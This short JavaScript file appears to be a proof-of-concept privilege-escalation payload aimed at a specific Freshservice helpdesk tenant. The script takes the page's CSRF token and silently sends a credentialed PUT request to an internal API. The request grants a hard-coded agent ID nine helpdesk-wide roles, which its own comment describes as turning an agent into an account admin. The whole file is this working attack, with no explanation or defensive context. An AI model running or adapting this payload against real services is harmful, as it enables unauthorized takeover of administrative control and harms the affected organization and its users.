async function sendRequests() {
    try {
        // First step call Csrf-Token by create variable and used var name in the headers
        const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

        // Execute PUT request that convert Agent ==> account admin
        await fetch('https://dubaiservicedesk.freshservice.com/api/_/agents/59000362316/map_workspace_groups_and_roles', {
            method: 'PUT',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'X-Csrf-Token': csrfToken
            },
            body: `{"observer_of":[],"member_of":[],"roles":[{"role_id":59000099262,"assignment_scope":"entire_helpdesk"},{"role_id":59000099265,"assignment_scope":"entire_helpdesk"},{"role_id":59000099263,"assignment_scope":"entire_helpdesk"},{"role_id":59000099267,"assignment_scope":"entire_helpdesk"},{"role_id":59000099271,"assignment_scope":"entire_helpdesk"},{"role_id":59000099269,"assignment_scope":"entire_helpdesk"},{"role_id":59000099268,"assignment_scope":"entire_helpdesk"},{"role_id":59000099264,"assignment_scope":"entire_helpdesk"},{"role_id":59000099266,"assignment_scope":"entire_helpdesk"}],"workspace_id":2}`
        });

        console.log('Requests completed successfully');
    } catch (error) {
        console.error('Error:', error);
    }
}

sendRequests();
